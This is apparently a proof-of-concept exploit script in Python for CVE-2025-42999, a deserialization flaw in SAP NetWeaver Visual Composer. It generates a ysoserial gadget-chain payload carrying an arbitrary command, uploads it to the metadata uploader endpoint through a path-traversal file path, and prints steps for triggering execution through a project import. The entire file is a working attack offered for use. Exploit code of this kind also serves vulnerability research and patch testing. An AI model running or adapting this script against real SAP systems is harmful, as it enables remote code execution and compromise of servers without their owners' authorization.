#!/usr/bin/env python3
"""
PoC for CVE-2025-42999: SAP NetWeaver Visual Composer Metadata Uploader Deserialization RCE. The content may need to be edited for use in different environments/scenarios.

This script:
1. Generates a Commons-Collections1 gadget chain payload via ysoserial.
2. Uploads it to the metadata uploader endpoint with path traversal.
3. Prints instructions to trigger deserialization via Visual Composer project import.

Usage:
    python3 poc.py \
        --target https://victim.sap.local \
        --ysoserial ysoserial.jar \
        --cmd "whoami"
"""

import argparse
import subprocess
import requests
import sys
import os
from urllib.parse import urljoin

def generate_payload(ysoserial_path, gadget_chain, command, out_file):
    print(f"[*] Generating payload with gadget {gadget_chain} and command: {command}")
    proc = subprocess.run(
        ["java", "-jar", ysoserial_path, gadget_chain, command],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    if proc.returncode != 0:
        print("[-] ysoserial error:", proc.stderr.decode(), file=sys.stderr)
        sys.exit(1)
    with open(out_file, "wb") as f:
        f.write(proc.stdout)
    print(f"[+] Payload saved to {out_file}")

def upload_payload(target_url, payload_path, remote_path):
    upload_endpoint = urljoin(target_url, "/developmentserver/metadatauploader")
    print(f"[*] Uploading payload to {upload_endpoint}")
    files = {
        "file": (
            os.path.basename(payload_path),
            open(payload_path, "rb"),
            "application/octet-stream"
        )
    }
    data = {"path": remote_path}
    resp = requests.post(upload_endpoint, files=files, data=data, verify=False)
    print(f"[+] Upload response: HTTP {resp.status_code}")
    if not resp.ok:
        print("[-] Upload failed:", resp.text, file=sys.stderr)
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="PoC for CVE-2025-42999")
    parser.add_argument("--target",    required=True, help="Base URL of the SAP server")
    parser.add_argument("--ysoserial", required=True, help="Path to ysoserial.jar")
    parser.add_argument("--gadget",    default="CommonsCollections1", help="Gadget chain to use")
    parser.add_argument("--cmd",       default="id", help="Command to execute on the server")
    parser.add_argument(
        "--remote-path",
        default="../../../../apps/sap.com/vc~wd~ext/metadata/exploit.bin",
        help="Destination path on server (with traversal)"
    )
    args = parser.parse_args()

    payload_file = "exploit.bin"
    generate_payload(args.ysoserial, args.gadget, args.cmd, payload_file)
    upload_payload(args.target, payload_file, args.remote_path)

    print("\n[+] Upload complete. To trigger deserialization, import the uploaded exploit.bin as a Visual Composer project:")
    print("    1. Log in to SAP NetWeaver Visual Composer.")
    print("    2. Use the Import function and point to:")
    print(f"       apps/sap.com/vc~wd~ext/metadata/exploit.bin")
    print("    3. Observe command execution on the server (e.g., via Visual Composer logs or side-effects).")

if __name__ == "__main__":
    main()
